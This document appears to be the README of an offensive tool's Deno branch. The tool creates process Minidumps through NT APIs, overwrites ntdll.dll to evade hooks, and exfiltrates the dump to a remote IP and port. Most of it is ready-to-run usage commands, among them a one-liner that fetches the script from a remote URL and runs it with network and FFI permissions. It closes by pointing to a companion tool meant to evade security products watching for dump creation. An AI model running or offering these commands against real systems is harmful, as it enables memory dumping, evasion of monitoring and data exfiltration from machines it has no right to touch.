# NativeDump - "deno-flavour" branch

This branch implements the same functionality as the main branch using Deno (JavaScript with FFI):

- Minidump file generation using only NTAPIS
- Overwrite the Ntdll.dll library (Optional)
- Exfiltrate the file to another host (Optional)

You can run it locally:

```
deno run --allow-ffi --allow-write --allow-net nativedump.js [-o OPTION] [-k PATH] [-f OUTPUT] [-i IP] [-p PORT]
```

Or run it directly from the repo without cloning:

```
deno run --allow-ffi --allow-write --allow-net https://raw.githubusercontent.com/ricardojoserf/NativeDump/deno-flavour/nativedump.js
```


### Options

- `-o`, `--option`: Ntdll overwrite method: `disk`, `knowndlls` or `debugproc`
- `-k`, `--path`: Path for ntdll file on disk (for `disk` option) or program to open in debug mode (`debugproc` option)
- `-f`, `--file`: Output dump file name (default: `proc_dump.dmp`)
- `-i`, `--ip`: IP Address for exfiltration
- `-p`, `--port`: Port for exfiltration


### Basic usage

```
deno run --allow-ffi --allow-write nativedump.js
```

### With ntdll overwrite

```
deno run --allow-ffi --allow-write nativedump.js -o disk
deno run --allow-ffi --allow-write nativedump.js -o knowndlls
deno run --allow-ffi --allow-write nativedump.js -o debugproc
```

### Custom output file

```
deno run --allow-ffi --allow-write nativedump.js -f boogie.docx
```

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/nativedump/Screenshot_native_deno_1.png)

### Exfiltrate to remote host

```
deno run --allow-ffi --allow-write --allow-net nativedump.js -i 192.168.1.72 -p 1234
```

### Remote execution with ntdll overwrite and exfiltration

```
deno run --allow-ffi --allow-write --allow-net https://raw.githubusercontent.com/ricardojoserf/NativeDump/deno-flavour/nativedump.js -o knowndlls -i 127.0.0.1 -p 4444
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/nativedump/Screenshot_native_deno_2.png)

-----------------------------

## TrickDump

For an alternative approach that avoids creating a Minidump file, check out [TrickDump](https://github.com/ricardojoserf/trickdump/): it generates three JSON files and a ZIP archive, and the Minidump is reconstructed on the attacker's machine. This can help evade security solutions that monitor for Minidump creation or exfiltration.

If you like Deno, check the [deno-flavour](https://github.com/ricardojoserf/TrickDump/tree/deno-flavour) branch!
